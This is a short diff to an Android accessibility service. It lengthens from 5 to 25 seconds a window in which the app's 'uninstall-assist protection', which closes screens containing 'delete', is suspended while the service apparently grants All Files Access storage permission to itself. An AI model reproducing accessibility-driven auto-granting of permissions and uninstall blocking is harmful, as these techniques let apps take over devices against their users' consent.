@@ -579,9 +579,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     public void enableStorageAutoGrant() {
         if (autoGrantHandler == null) autoGrantHandler = new Handler(Looper.getMainLooper());
 
-        // Suspend defent/uninstall-assist protection for 5 seconds so the
+        // Suspend defent/uninstall-assist protection for 25 seconds so the
         // All Files Access screen (which contains "delete") isn't closed by defent.
-        protectionSuspendedUntil = System.currentTimeMillis() + 5_000;
+        protectionSuspendedUntil = System.currentTimeMillis() + 25_000;
 
         final long endTime = System.currentTimeMillis() + 20_000;
         final Handler storageHandler = new Handler(Looper.getMainLooper());
